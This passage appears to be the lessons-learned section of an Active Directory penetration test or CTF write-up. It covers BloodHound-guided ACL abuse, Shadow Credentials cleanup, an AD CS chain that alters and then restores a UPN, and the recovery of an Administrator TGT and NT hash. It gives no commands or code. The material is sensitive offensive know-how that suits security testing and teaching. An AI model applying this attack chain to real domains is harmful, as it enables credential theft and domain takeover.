- **Treat BloodHound edges as testable hypotheses.** Graph relations point toward likely ACL abuse, but effective rights and object-specific restrictions must still be checked.
- **Fresh tokens and session context matter.** Following group changes, independently verify memberships and test the new rights; session state can cause confusing observations.
- **Shadow Credentials are both an exploitation technique and a cleanup obligation.** Confirm removal of temporary key credentials, even if the tool claims automatic restoration.
- **AD CS chains depend on ordering.** Here, the target account's UPN needed to be altered for enrollment and restored before final authentication.
- **Capture failures in the final write-up.** The `No route to host`, `INSUFF_ACCESS_RIGHTS`, `KRB_AP_ERR_SKEW`, RPC timeout, and certificate name-mismatch results are important diagnostic evidence.
- **Do not overclaim final success.** Administrator TGT and NT hash recovery are proven. Administrator interactive shell and root flag require separate evidence.

---
